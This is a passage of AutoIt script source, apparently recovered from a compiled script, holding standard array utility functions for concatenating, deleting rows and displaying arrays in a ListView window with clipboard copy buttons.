	Local $ARESULT [ $ITOTAL + 1 ]
	$ARESULT [ 0 ] = $ITOTAL
	Local $ICOUNT = 1
	While $ILEFT > 0
		__ARRAY_GETNEXT ( $IN , $IR , $ILEFT , $ITOTAL , $AIDX )
		For $I = 0 To $ISET + 4294967295
			$ARESULT [ $ICOUNT ] &= $AARRAY [ $AIDX [ $I ] ] & $SDELIMITER
		Next
		If $SDELIMITER <> "" Then $ARESULT [ $ICOUNT ] = StringTrimRight ( $ARESULT [ $ICOUNT ] , 1 )
		$ICOUNT += 1
	WEnd
	Return $ARESULT
EndFunc
Func _ARRAYCONCATENATE ( ByRef $AARRAYTARGET , Const ByRef $AARRAYSOURCE , $ISTART = 0 )
	If $ISTART = Default Then $ISTART = 0
	If Not IsArray ( $AARRAYTARGET ) Then Return SetError ( 1 , 0 , + 4294967295 )
	If Not IsArray ( $AARRAYSOURCE ) Then Return SetError ( 2 , 0 , + 4294967295 )
	Local $IDIM_TOTAL_TGT = UBound ( $AARRAYTARGET , $UBOUND_DIMENSIONS )
	Local $IDIM_TOTAL_SRC = UBound ( $AARRAYSOURCE , $UBOUND_DIMENSIONS )
	Local $IDIM_1_TGT = UBound ( $AARRAYTARGET , $UBOUND_ROWS )
	Local $IDIM_1_SRC = UBound ( $AARRAYSOURCE , $UBOUND_ROWS )
	If $ISTART < 0 Or $ISTART > $IDIM_1_SRC + 4294967295 Then Return SetError ( 6 , 0 , + 4294967295 )
	Switch $IDIM_TOTAL_TGT
	Case 1
		If $IDIM_TOTAL_SRC <> 1 Then Return SetError ( 4 , 0 , + 4294967295 )
		ReDim $AARRAYTARGET [ $IDIM_1_TGT + $IDIM_1_SRC - $ISTART ]
		For $I = $ISTART To $IDIM_1_SRC + 4294967295
			$AARRAYTARGET [ $IDIM_1_TGT + $I - $ISTART ] = $AARRAYSOURCE [ $I ]
		Next
	Case 2
		If $IDIM_TOTAL_SRC <> 2 Then Return SetError ( 4 , 0 , + 4294967295 )
		Local $IDIM_2_TGT = UBound ( $AARRAYTARGET , $UBOUND_COLUMNS )
		If UBound ( $AARRAYSOURCE , $UBOUND_COLUMNS ) <> $IDIM_2_TGT Then Return SetError ( 5 , 0 , + 4294967295 )
		ReDim $AARRAYTARGET [ $IDIM_1_TGT + $IDIM_1_SRC - $ISTART ] [ $IDIM_2_TGT ]
		For $I = $ISTART To $IDIM_1_SRC + 4294967295
			For $J = 0 To $IDIM_2_TGT + 4294967295
				$AARRAYTARGET [ $IDIM_1_TGT + $I - $ISTART ] [ $J ] = $AARRAYSOURCE [ $I ] [ $J ]
			Next
		Next
Case Else
		Return SetError ( 3 , 0 , + 4294967295 )
	EndSwitch
	Return UBound ( $AARRAYTARGET , $UBOUND_ROWS )
EndFunc
Func _ARRAYDELETE ( ByRef $AARRAY , $VRANGE )
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , + 4294967295 )
	Local $IDIM_1 = UBound ( $AARRAY , $UBOUND_ROWS ) + 4294967295
	If IsArray ( $VRANGE ) Then
		If UBound ( $VRANGE , $UBOUND_DIMENSIONS ) <> 1 Or UBound ( $VRANGE , $UBOUND_ROWS ) < 2 Then Return SetError ( 4 , 0 , + 4294967295 )
	Else
		Local $INUMBER , $ASPLIT_1 , $ASPLIT_2
		$VRANGE = StringStripWS ( $VRANGE , 8 )
		$ASPLIT_1 = StringSplit ( $VRANGE , ";" )
		$VRANGE = ""
		For $I = 1 To $ASPLIT_1 [ 0 ]
			If Not StringRegExp ( $ASPLIT_1 [ $I ] , "^\d+(-\d+)?$" ) Then Return SetError ( 3 , 0 , + 4294967295 )
			$ASPLIT_2 = StringSplit ( $ASPLIT_1 [ $I ] , "-" )
			Switch $ASPLIT_2 [ 0 ]
			Case 1
				$VRANGE &= $ASPLIT_2 [ 1 ] & ";"
			Case 2
				If Number ( $ASPLIT_2 [ 2 ] ) >= Number ( $ASPLIT_2 [ 1 ] ) Then
					$INUMBER = $ASPLIT_2 [ 1 ] + 4294967295
					Do
						$INUMBER += 1
						$VRANGE &= $INUMBER & ";"
					Until $INUMBER = $ASPLIT_2 [ 2 ]
				EndIf
			EndSwitch
		Next
		$VRANGE = StringSplit ( StringTrimRight ( $VRANGE , 1 ) , ";" )
	EndIf
	If $VRANGE [ 1 ] < 0 Or $VRANGE [ $VRANGE [ 0 ] ] > $IDIM_1 Then Return SetError ( 5 , 0 , + 4294967295 )
	Local $ICOPYTO_INDEX = 0
	Switch UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	Case 1
		For $I = 1 To $VRANGE [ 0 ]
			$AARRAY [ $VRANGE [ $I ] ] = ChrW ( 64177 )
		Next
		For $IREADFROM_INDEX = 0 To $IDIM_1
			If $AARRAY [ $IREADFROM_INDEX ] == ChrW ( 64177 ) Then
				ContinueLoop
			Else
				If $IREADFROM_INDEX <> $ICOPYTO_INDEX Then
					$AARRAY [ $ICOPYTO_INDEX ] = $AARRAY [ $IREADFROM_INDEX ]
				EndIf
				$ICOPYTO_INDEX += 1
			EndIf
		Next
		ReDim $AARRAY [ $IDIM_1 - $VRANGE [ 0 ] + 1 ]
	Case 2
		Local $IDIM_2 = UBound ( $AARRAY , $UBOUND_COLUMNS ) + 4294967295
		For $I = 1 To $VRANGE [ 0 ]
			$AARRAY [ $VRANGE [ $I ] ] [ 0 ] = ChrW ( 64177 )
		Next
		For $IREADFROM_INDEX = 0 To $IDIM_1
			If $AARRAY [ $IREADFROM_INDEX ] [ 0 ] == ChrW ( 64177 ) Then
				ContinueLoop
			Else
				If $IREADFROM_INDEX <> $ICOPYTO_INDEX Then
					For $J = 0 To $IDIM_2
						$AARRAY [ $ICOPYTO_INDEX ] [ $J ] = $AARRAY [ $IREADFROM_INDEX ] [ $J ]
					Next
				EndIf
				$ICOPYTO_INDEX += 1
			EndIf
		Next
		ReDim $AARRAY [ $IDIM_1 - $VRANGE [ 0 ] + 1 ] [ $IDIM_2 + 1 ]
Case Else
		Return SetError ( 2 , 0 , False )
	EndSwitch
	Return UBound ( $AARRAY , $UBOUND_ROWS )
EndFunc
Func _ARRAYDISPLAY ( Const ByRef $AARRAY , $STITLE = Default , $SARRAYRANGE = Default , $IFLAGS = Default , $VUSER_SEPARATOR = Default , $SHEADER = Default , $IMAX_COLWIDTH = Default , $IALT_COLOR = Default , $HUSER_FUNCTION = Default )
	If $STITLE = Default Then $STITLE = "ArrayDisplay"
	If $SARRAYRANGE = Default Then $SARRAYRANGE = ""
	If $IFLAGS = Default Then $IFLAGS = 0
	If $VUSER_SEPARATOR = Default Then $VUSER_SEPARATOR = ""
	If $SHEADER = Default Then $SHEADER = ""
	If $IMAX_COLWIDTH = Default Then $IMAX_COLWIDTH = 350
	If $IALT_COLOR = Default Then $IALT_COLOR = 0
	If $HUSER_FUNCTION = Default Then $HUSER_FUNCTION = 0
	Local $ITRANSPOSE = BitAND ( $IFLAGS , 1 )
	Local $ICOLALIGN = BitAND ( $IFLAGS , 6 )
	Local $IVERBOSE = BitAND ( $IFLAGS , 8 )
	Local $IBUTTONMARGIN = ( ( BitAND ( $IFLAGS , 32 ) ) ? ( 0 ) : ( ( BitAND ( $IFLAGS , 16 ) ) ? ( 20 ) : ( 40 ) ) )
	Local $INOROW = BitAND ( $IFLAGS , 64 )
	Local $SMSG = "" , $IRET = 1
	If IsArray ( $AARRAY ) Then
		Local $IDIMENSION = UBound ( $AARRAY , $UBOUND_DIMENSIONS ) , $IROWCOUNT = UBound ( $AARRAY , $UBOUND_ROWS ) , $ICOLCOUNT = UBound ( $AARRAY , $UBOUND_COLUMNS )
		If $IDIMENSION > 2 Then
			$SMSG = "Larger than 2D array passed to function"
			$IRET = 2
		EndIf
	Else
		$SMSG = "No array variable passed to function"
	EndIf
	If $SMSG Then
		If $IVERBOSE And MsgBox ( $MB_SYSTEMMODAL + $MB_ICONERROR + $MB_YESNO , "ArrayDisplay Error: " & $STITLE , $SMSG & @CRLF & @CRLF & "Exit the script?" ) = $IDYES Then
			Exit
		Else
			Return SetError ( $IRET , 0 , "" )
		EndIf
	EndIf
	Local $ICW_COLWIDTH = Number ( $VUSER_SEPARATOR )
	Local $SAD_SEPARATOR = ChrW ( 64177 )
	Local $SCURR_SEPARATOR = Opt ( "GUIDataSeparatorChar" , $SAD_SEPARATOR )
	If $VUSER_SEPARATOR = "" Then $VUSER_SEPARATOR = $SCURR_SEPARATOR
	Local $VTMP , $IROWLIMIT = 65525 , $ICOLLIMIT = 250
	Local $IDATAROW = $IROWCOUNT
	Local $IDATACOL = $ICOLCOUNT
	Local $IITEM_START = 0 , $IITEM_END = $IROWCOUNT + 4294967295 , $ISUBITEM_START = 0 , $ISUBITEM_END = ( ( $IDIMENSION = 2 ) ? ( $ICOLCOUNT + 4294967295 ) : ( 0 ) )
	Local $BRANGE_FLAG = False , $AVRANGESPLIT
	If $SARRAYRANGE Then
		Local $AARRAY_RANGE = StringRegExp ( $SARRAYRANGE & "||" , "(?U)(.*)\|" , 3 )
		If $AARRAY_RANGE [ 0 ] Then
			$AVRANGESPLIT = StringSplit ( $AARRAY_RANGE [ 0 ] , ":" )
			If @error Then
				$IITEM_END = Number ( $AVRANGESPLIT [ 1 ] )
			Else
				$IITEM_START = Number ( $AVRANGESPLIT [ 1 ] )
				$IITEM_END = Number ( $AVRANGESPLIT [ 2 ] )
			EndIf
		EndIf
		If $IITEM_START > $IITEM_END Then
			$VTMP = $IITEM_START
			$IITEM_START = $IITEM_END
			$IITEM_END = $VTMP
		EndIf
		If $IITEM_START < 0 Then $IITEM_START = 0
		If $IITEM_END > $IROWCOUNT + 4294967295 Then $IITEM_END = $IROWCOUNT + 4294967295
		If $IITEM_START <> 0 Or $IITEM_END <> $IROWCOUNT + 4294967295 Then $BRANGE_FLAG = True
		If $IDIMENSION = 2 And $AARRAY_RANGE [ 1 ] Then
			$AVRANGESPLIT = StringSplit ( $AARRAY_RANGE [ 1 ] , ":" )
			If @error Then
				$ISUBITEM_END = Number ( $AVRANGESPLIT [ 1 ] )
			Else
				$ISUBITEM_START = Number ( $AVRANGESPLIT [ 1 ] )
				$ISUBITEM_END = Number ( $AVRANGESPLIT [ 2 ] )
			EndIf
			If $ISUBITEM_START > $ISUBITEM_END Then
				$VTMP = $ISUBITEM_START
				$ISUBITEM_START = $ISUBITEM_END
				$ISUBITEM_END = $VTMP
			EndIf
			If $ISUBITEM_START < 0 Then $ISUBITEM_START = 0
			If $ISUBITEM_END > $ICOLCOUNT + 4294967295 Then $ISUBITEM_END = $ICOLCOUNT + 4294967295
			If $ISUBITEM_START <> 0 Or $ISUBITEM_END <> $ICOLCOUNT + 4294967295 Then $BRANGE_FLAG = True
		EndIf
	EndIf
	Local $SDISPLAYDATA = "[" & $IDATAROW
	Local $BTRUNCATED = False
	If $ITRANSPOSE Then
		If $IITEM_END - $IITEM_START > $ICOLLIMIT Then
			$BTRUNCATED = True
			$IITEM_END = $IITEM_START + $ICOLLIMIT + 4294967295
		EndIf
	Else
		If $IITEM_END - $IITEM_START > $IROWLIMIT Then
			$BTRUNCATED = True
			$IITEM_END = $IITEM_START + $IROWLIMIT + 4294967295
		EndIf
	EndIf
	If $BTRUNCATED Then
		$SDISPLAYDATA &= "*]"
	Else
		$SDISPLAYDATA &= "]"
	EndIf
	If $IDIMENSION = 2 Then
		$SDISPLAYDATA &= " [" & $IDATACOL
		If $ITRANSPOSE Then
			If $ISUBITEM_END - $ISUBITEM_START > $IROWLIMIT Then
				$BTRUNCATED = True
				$ISUBITEM_END = $ISUBITEM_START + $IROWLIMIT + 4294967295
			EndIf
		Else
			If $ISUBITEM_END - $ISUBITEM_START > $ICOLLIMIT Then
				$BTRUNCATED = True
				$ISUBITEM_END = $ISUBITEM_START + $ICOLLIMIT + 4294967295
			EndIf
		EndIf
		If $BTRUNCATED Then
			$SDISPLAYDATA &= "*]"
		Else
			$SDISPLAYDATA &= "]"
		EndIf
	EndIf
	Local $STIPDATA = ""
	If $BTRUNCATED Then $STIPDATA &= "Truncated"
	If $BRANGE_FLAG Then
		If $STIPDATA Then $STIPDATA &= " - "
		$STIPDATA &= "Range set"
	EndIf
	If $ITRANSPOSE Then
		If $STIPDATA Then $STIPDATA &= " - "
		$STIPDATA &= "Transposed"
	EndIf
	Local $ASHEADER = StringSplit ( $SHEADER , $SCURR_SEPARATOR , $STR_NOCOUNT )
	If UBound ( $ASHEADER ) = 0 Then Local $ASHEADER [ 1 ] = [ "" ]
	$SHEADER = "Row"
	Local $IINDEX = $ISUBITEM_START
	If $ITRANSPOSE Then
		For $J = $IITEM_START To $IITEM_END
			$SHEADER &= $SAD_SEPARATOR & "Col " & $J
		Next
	Else
		If $ASHEADER [ 0 ] Then
			For $IINDEX = $ISUBITEM_START To $ISUBITEM_END
				If $IINDEX >= UBound ( $ASHEADER ) Then ExitLoop
				$SHEADER &= $SAD_SEPARATOR & $ASHEADER [ $IINDEX ]
			Next
		EndIf
		For $J = $IINDEX To $ISUBITEM_END
			$SHEADER &= $SAD_SEPARATOR & "Col " & $J
		Next
	EndIf
	If $INOROW Then $SHEADER = StringTrimLeft ( $SHEADER , 4 )
	If $IVERBOSE And ( $IITEM_END - $IITEM_START + 1 ) * ( $ISUBITEM_END - $ISUBITEM_START + 1 ) > 10000 Then
		SplashTextOn ( "ArrayDisplay" , "Preparing display" & @CRLF & @CRLF & "Please be patient" , 300 , 100 )
	EndIf
	Local $IBUFFER = 4094
	If $ITRANSPOSE Then
		$VTMP = $IITEM_START
		$IITEM_START = $ISUBITEM_START
		$ISUBITEM_START = $VTMP
		$VTMP = $IITEM_END
		$IITEM_END = $ISUBITEM_END
		$ISUBITEM_END = $VTMP
	EndIf
	Local $AVARRAYTEXT [ $IITEM_END - $IITEM_START + 1 ]
	For $I = $IITEM_START To $IITEM_END
		If Not $INOROW Then $AVARRAYTEXT [ $I - $IITEM_START ] = "[" & $I & "]"
		For $J = $ISUBITEM_START To $ISUBITEM_END
			If $IDIMENSION = 1 Then
				If $ITRANSPOSE Then
					Switch VarGetType ( $AARRAY [ $J ] )
					Case "Array"
						$VTMP = "{Array}"
				Case Else
						$VTMP = $AARRAY [ $J ]
					EndSwitch
				Else
					Switch VarGetType ( $AARRAY [ $I ] )
					Case "Array"
						$VTMP = "{Array}"
				Case Else
						$VTMP = $AARRAY [ $I ]
					EndSwitch
				EndIf
			Else
				If $ITRANSPOSE Then
					Switch VarGetType ( $AARRAY [ $J ] [ $I ] )
					Case "Array"
						$VTMP = "{Array}"
				Case Else
						$VTMP = $AARRAY [ $J ] [ $I ]
					EndSwitch
				Else
					Switch VarGetType ( $AARRAY [ $I ] [ $J ] )
					Case "Array"
						$VTMP = "{Array}"
				Case Else
						$VTMP = $AARRAY [ $I ] [ $J ]
					EndSwitch
				EndIf
			EndIf
			If StringLen ( $VTMP ) > $IBUFFER Then $VTMP = StringLeft ( $VTMP , $IBUFFER )
			$AVARRAYTEXT [ $I - $IITEM_START ] &= $SAD_SEPARATOR & $VTMP
		Next
		If $INOROW Then $AVARRAYTEXT [ $I - $IITEM_START ] = StringTrimLeft ( $AVARRAYTEXT [ $I - $IITEM_START ] , 1 )
	Next
	Local Const $_ARRAYCONSTANT_GUI_DOCKBOTTOM = 64
	Local Const $_ARRAYCONSTANT_GUI_DOCKBORDERS = 102
	Local Const $_ARRAYCONSTANT_GUI_DOCKHEIGHT = 512
	Local Const $_ARRAYCONSTANT_GUI_DOCKLEFT = 2
	Local Const $_ARRAYCONSTANT_GUI_DOCKRIGHT = 4
	Local Const $_ARRAYCONSTANT_GUI_DOCKHCENTER = 8
	Local Const $_ARRAYCONSTANT_GUI_EVENT_CLOSE = + 4294967293
	Local Const $_ARRAYCONSTANT_GUI_FOCUS = 256
	Local Const $_ARRAYCONSTANT_GUI_BKCOLOR_LV_ALTERNATE = 4261412864
	Local Const $_ARRAYCONSTANT_SS_CENTER = 1
	Local Const $_ARRAYCONSTANT_SS_CENTERIMAGE = 512
	Local Const $_ARRAYCONSTANT_LVM_GETITEMCOUNT = ( 4096 + 4 )
	Local Const $_ARRAYCONSTANT_LVM_GETITEMRECT = ( 4096 + 14 )
	Local Const $_ARRAYCONSTANT_LVM_GETCOLUMNWIDTH = ( 4096 + 29 )
	Local Const $_ARRAYCONSTANT_LVM_SETCOLUMNWIDTH = ( 4096 + 30 )
	Local Const $_ARRAYCONSTANT_LVM_GETITEMSTATE = ( 4096 + 44 )
	Local Const $_ARRAYCONSTANT_LVM_GETSELECTEDCOUNT = ( 4096 + 50 )
	Local Const $_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE = ( 4096 + 54 )
	Local Const $_ARRAYCONSTANT_LVS_EX_GRIDLINES = 1
	Local Const $_ARRAYCONSTANT_LVIS_SELECTED = 2
	Local Const $_ARRAYCONSTANT_LVS_SHOWSELALWAYS = 8
	Local Const $_ARRAYCONSTANT_LVS_EX_FULLROWSELECT = 32
	Local Const $_ARRAYCONSTANT_WS_EX_CLIENTEDGE = 512
	Local Const $_ARRAYCONSTANT_WS_MAXIMIZEBOX = 65536
	Local Const $_ARRAYCONSTANT_WS_MINIMIZEBOX = 131072
	Local Const $_ARRAYCONSTANT_WS_SIZEBOX = 262144
	Local Const $_ARRAYCONSTANT_WM_SETREDRAW = 11
	Local Const $_ARRAYCONSTANT_LVSCW_AUTOSIZE = + 4294967295
	Local $ICOORDMODE = Opt ( "GUICoordMode" , 1 )
	Local $IORGWIDTH = 210 , $IHEIGHT = 200 , $IMINSIZE = 250
	Local $HGUI = GUICreate ( $STITLE , $IORGWIDTH , $IHEIGHT , Default , Default , BitOR ( $_ARRAYCONSTANT_WS_SIZEBOX , $_ARRAYCONSTANT_WS_MINIMIZEBOX , $_ARRAYCONSTANT_WS_MAXIMIZEBOX ) )
	Local $AIGUISIZE = WinGetClientSize ( $HGUI )
	Local $IBUTTONWIDTH_2 = $AIGUISIZE [ 0 ] / 2
	Local $IBUTTONWIDTH_3 = $AIGUISIZE [ 0 ] / 3
	Local $IDLISTVIEW = GUICtrlCreateListView ( $SHEADER , 0 , 0 , $AIGUISIZE [ 0 ] , $AIGUISIZE [ 1 ] - $IBUTTONMARGIN , $_ARRAYCONSTANT_LVS_SHOWSELALWAYS )
	GUICtrlSetBkColor ( $IDLISTVIEW , $_ARRAYCONSTANT_GUI_BKCOLOR_LV_ALTERNATE )
	GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE , $_ARRAYCONSTANT_LVS_EX_GRIDLINES , $_ARRAYCONSTANT_LVS_EX_GRIDLINES )
	GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE , $_ARRAYCONSTANT_LVS_EX_FULLROWSELECT , $_ARRAYCONSTANT_LVS_EX_FULLROWSELECT )
	GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE , $_ARRAYCONSTANT_WS_EX_CLIENTEDGE , $_ARRAYCONSTANT_WS_EX_CLIENTEDGE )
	Local $IDCOPY_ID = 9999 , $IDCOPY_DATA = 99999 , $IDDATA_LABEL = 99999 , $IDUSER_FUNC = 99999 , $IDEXIT_SCRIPT = 99999
	If $IBUTTONMARGIN Then
		$IDCOPY_ID = GUICtrlCreateButton ( "Copy Data && Hdr/Row" , 0 , $AIGUISIZE [ 1 ] - $IBUTTONMARGIN , $IBUTTONWIDTH_2 , 20 )
		$IDCOPY_DATA = GUICtrlCreateButton ( "Copy Data Only" , $IBUTTONWIDTH_2 , $AIGUISIZE [ 1 ] - $IBUTTONMARGIN , $IBUTTONWIDTH_2 , 20 )
		If $IBUTTONMARGIN = 40 Then
			Local $IBUTTONWIDTH_VAR = $IBUTTONWIDTH_2
			Local $IOFFSET = $IBUTTONWIDTH_2
			If IsFunc ( $HUSER_FUNCTION ) Then
				$IDUSER_FUNC = GUICtrlCreateButton ( "Run User Func" , $IBUTTONWIDTH_3 , $AIGUISIZE [ 1 ] + 4294967276 , $IBUTTONWIDTH_3 , 20 )
				$IBUTTONWIDTH_VAR = $IBUTTONWIDTH_3
				$IOFFSET = $IBUTTONWIDTH_3 * 2
			EndIf
			$IDEXIT_SCRIPT = GUICtrlCreateButton ( "Exit Script" , $IOFFSET , $AIGUISIZE [ 1 ] + 4294967276 , $IBUTTONWIDTH_VAR , 20 )
			$IDDATA_LABEL = GUICtrlCreateLabel ( $SDISPLAYDATA , 0 , $AIGUISIZE [ 1 ] + 4294967276 , $IBUTTONWIDTH_VAR , 18 , BitOR ( $_ARRAYCONSTANT_SS_CENTER , $_ARRAYCONSTANT_SS_CENTERIMAGE ) )
			Select
			Case $BTRUNCATED Or $ITRANSPOSE Or $BRANGE_FLAG
				GUICtrlSetColor ( $IDDATA_LABEL , 16711680 )
				GUICtrlSetTip ( $IDDATA_LABEL , $STIPDATA )
			EndSelect
		EndIf
	EndIf
	GUICtrlSetResizing ( $IDLISTVIEW , $_ARRAYCONSTANT_GUI_DOCKBORDERS )
	GUICtrlSetResizing ( $IDCOPY_ID , $_ARRAYCONSTANT_GUI_DOCKLEFT + $_ARRAYCONSTANT_GUI_DOCKBOTTOM + $_ARRAYCONSTANT_GUI_DOCKHEIGHT )
	GUICtrlSetResizing ( $IDCOPY_DATA , $_ARRAYCONSTANT_GUI_DOCKRIGHT + $_ARRAYCONSTANT_GUI_DOCKBOTTOM + $_ARRAYCONSTANT_GUI_DOCKHEIGHT )
	GUICtrlSetResizing ( $IDDATA_LABEL , $_ARRAYCONSTANT_GUI_DOCKLEFT + $_ARRAYCONSTANT_GUI_DOCKBOTTOM + $_ARRAYCONSTANT_GUI_DOCKHEIGHT )
	GUICtrlSetResizing ( $IDUSER_FUNC , $_ARRAYCONSTANT_GUI_DOCKHCENTER + $_ARRAYCONSTANT_GUI_DOCKBOTTOM + $_ARRAYCONSTANT_GUI_DOCKHEIGHT )
	GUICtrlSetResizing ( $IDEXIT_SCRIPT , $_ARRAYCONSTANT_GUI_DOCKRIGHT + $_ARRAYCONSTANT_GUI_DOCKBOTTOM + $_ARRAYCONSTANT_GUI_DOCKHEIGHT )
	GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_WM_SETREDRAW , 0 , 0 )
	Local $IDITEM
	For $I = 0 To UBound ( $AVARRAYTEXT ) + 4294967295
		$IDITEM = GUICtrlCreateListViewItem ( $AVARRAYTEXT [ $I ] , $IDLISTVIEW )
		If $IALT_COLOR Then
			GUICtrlSetBkColor ( $IDITEM , $IALT_COLOR )
		EndIf
	Next
	If $ICOLALIGN Then
		Local Const $_ARRAYCONSTANT_LVCF_FMT = 1
		Local Const $_ARRAYCONSTANT_LVM_SETCOLUMNW = ( 4096 + 96 )
		Local $TCOLUMN = DllStructCreate ( "uint Mask;int Fmt;int CX;ptr Text;int TextMax;int SubItem;int Image;int Order;int cxMin;int cxDefault;int cxIdeal" )
		DllStructSetData ( $TCOLUMN , "Mask" , $_ARRAYCONSTANT_LVCF_FMT )
		DllStructSetData ( $TCOLUMN , "Fmt" , $ICOLALIGN / 2 )
		Local $PCOLUMN = DllStructGetPtr ( $TCOLUMN )
		For $I = 1 To $ISUBITEM_END - $ISUBITEM_START + 1
			GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_LVM_SETCOLUMNW , $I , $PCOLUMN )
		Next
	EndIf
	GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_WM_SETREDRAW , 1 , 0 )
	Local $IBORDER = 45
	If UBound ( $AVARRAYTEXT ) > 20 Then
		$IBORDER += 20
	EndIf
	Local $IWIDTH = $IBORDER , $ICOLWIDTH = 0 , $AICOLWIDTH [ $ISUBITEM_END - $ISUBITEM_START + 2 ] , $IMIN_COLWIDTH = 55
	For $I = 0 To $ISUBITEM_END - $ISUBITEM_START + 1
		GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_LVM_SETCOLUMNWIDTH , $I , $_ARRAYCONSTANT_LVSCW_AUTOSIZE )
		$ICOLWIDTH = GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_LVM_GETCOLUMNWIDTH , $I , 0 )
		If $ICOLWIDTH < $IMIN_COLWIDTH Then
			GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_LVM_SETCOLUMNWIDTH , $I , $IMIN_COLWIDTH )
			$ICOLWIDTH = $IMIN_COLWIDTH
		EndIf
		$IWIDTH += $ICOLWIDTH
		$AICOLWIDTH [ $I ] = $ICOLWIDTH
	Next
	If $INOROW Then $IWIDTH -= 55
	If $IWIDTH > @DesktopWidth + 4294967196 Then
		$IWIDTH = $IBORDER
		For $I = 0 To $ISUBITEM_END - $ISUBITEM_START + 1
			If $AICOLWIDTH [ $I ] > $IMAX_COLWIDTH Then
				GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_LVM_SETCOLUMNWIDTH , $I , $IMAX_COLWIDTH )
				$IWIDTH += $IMAX_COLWIDTH
			Else
				$IWIDTH += $AICOLWIDTH [ $I ]
			EndIf
		Next
	EndIf
	If $IWIDTH > @DesktopWidth + 4294967196 Then
		$IWIDTH = @DesktopWidth + 4294967196
	ElseIf $IWIDTH < $IMINSIZE Then
		$IWIDTH = $IMINSIZE
	EndIf
	Local $TRECT = DllStructCreate ( "struct; long Left;long Top;long Right;long Bottom; endstruct" )
	DllCall ( "user32.dll" , "struct*" , "SendMessageW" , "hwnd" , GUICtrlGetHandle ( $IDLISTVIEW ) , "uint" , $_ARRAYCONSTANT_LVM_GETITEMRECT , "wparam" , 0 , "struct*" , $TRECT )
	Local $AIWIN_POS = WinGetPos ( $HGUI )
	Local $AILV_POS = ControlGetPos ( $HGUI , "" , $IDLISTVIEW )
	$IHEIGHT = ( ( UBound ( $AVARRAYTEXT ) + 2 ) * ( DllStructGetData ( $TRECT , "Bottom" ) - DllStructGetData ( $TRECT , "Top" ) ) ) + $AIWIN_POS [ 3 ] - $AILV_POS [ 3 ]
	If $IHEIGHT > @DesktopHeight + 4294967196 Then
		$IHEIGHT = @DesktopHeight + 4294967196
	ElseIf $IHEIGHT < $IMINSIZE Then
		$IHEIGHT = $IMINSIZE
	EndIf
	If $IVERBOSE Then SplashOff ( )
	GUISetState ( @SW_HIDE , $HGUI )
	WinMove ( $HGUI , "" , ( @DesktopWidth - $IWIDTH ) / 2 , ( @DesktopHeight - $IHEIGHT ) / 2 , $IWIDTH , $IHEIGHT )
	GUISetState ( @SW_SHOW , $HGUI )
	Local $IONEVENTMODE = Opt ( "GUIOnEventMode" , 0 ) , $IMSG
	While 1
		$IMSG = GUIGetMsg ( )
		Switch $IMSG
		Case $_ARRAYCONSTANT_GUI_EVENT_CLOSE
			ExitLoop
		Case $IDCOPY_ID , $IDCOPY_DATA
			Local $ISEL_COUNT = GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_LVM_GETSELECTEDCOUNT , 0 , 0 )
			If $IVERBOSE And ( Not $ISEL_COUNT ) And ( $IITEM_END - $IITEM_START ) * ( $ISUBITEM_END - $ISUBITEM_START ) > 10000 Then
				SplashTextOn ( "ArrayDisplay" , "Copying data" & @CRLF & @CRLF & "Please be patient" , 300 , 100 )
			EndIf
			Local $SCLIP = "" , $SITEM , $ASPLIT
			For $I = 0 To $IITEM_END - $IITEM_START
				If $ISEL_COUNT And Not ( GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_LVM_GETITEMSTATE , $I , $_ARRAYCONSTANT_LVIS_SELECTED ) ) Then
					ContinueLoop
				EndIf
				$SITEM = $AVARRAYTEXT [ $I ]
				If $IMSG = $IDCOPY_DATA Then
					$SITEM = StringRegExpReplace ( $SITEM , "^\[\d+\].(.*)$" , "$1" )
				EndIf
				If $ICW_COLWIDTH Then
					$ASPLIT = StringSplit ( $SITEM , $SAD_SEPARATOR )
					$SITEM = ""
					For $J = 1 To $ASPLIT [ 0 ]
						$SITEM &= StringFormat ( "%-" & $ICW_COLWIDTH + 1 & "s" , StringLeft ( $ASPLIT [ $J ] , $ICW_COLWIDTH ) )
					Next
				Else
					$SITEM = StringReplace ( $SITEM , $SAD_SEPARATOR , $VUSER_SEPARATOR )
				EndIf
				$SCLIP &= $SITEM & @CRLF
			Next
			If $IMSG = $IDCOPY_ID Then
				If $ICW_COLWIDTH Then
					$ASPLIT = StringSplit ( $SHEADER , $SAD_SEPARATOR )
					$SITEM = ""
					For $J = 1 To $ASPLIT [ 0 ]
						$SITEM &= StringFormat ( "%-" & $ICW_COLWIDTH + 1 & "s" , StringLeft ( $ASPLIT [ $J ] , $ICW_COLWIDTH ) )
					Next
				Else
					$SITEM = StringReplace ( $SHEADER , $SAD_SEPARATOR , $VUSER_SEPARATOR )
				EndIf
				$SCLIP = $SITEM & @CRLF & $SCLIP
			EndIf
			ClipPut ( $SCLIP )
			SplashOff ( )
			GUICtrlSetState ( $IDLISTVIEW , $_ARRAYCONSTANT_GUI_FOCUS )
		Case $IDUSER_FUNC
			Local $AISELITEMS [ $IROWLIMIT ] = [ 0 ]
			For $I = 0 To GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_LVM_GETITEMCOUNT , 0 , 0 )
				If GUICtrlSendMsg ( $IDLISTVIEW , $_ARRAYCONSTANT_LVM_GETITEMSTATE , $I , $_ARRAYCONSTANT_LVIS_SELECTED ) Then
					$AISELITEMS [ 0 ] += 1
					$AISELITEMS [ $AISELITEMS [ 0 ] ] = $I + $IITEM_START
				EndIf
			Next
			ReDim $AISELITEMS [ $AISELITEMS [ 0 ] + 1 ]
			$HUSER_FUNCTION ( $AARRAY , $AISELITEMS )
